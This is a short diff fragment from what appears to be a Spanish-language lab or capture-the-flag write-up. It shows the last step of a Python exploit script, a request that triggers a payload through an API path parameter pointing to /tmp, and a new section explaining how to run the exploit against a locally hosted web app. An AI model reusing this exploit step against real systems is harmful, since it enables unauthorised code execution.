@@ -307,7 +307,7 @@ print("Step 4 execute payload")
 step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
 
-
-
-
+### ejecución del exploit 
+ejecutamos el exploit y primero nos pide la URL la cual seria `127.0.0.1:9090` ya que la web esta corriendo de manera local en 
+![[Pasted image 20240823150521.png]]
 ![[Pasted image 20240823150440.png]]
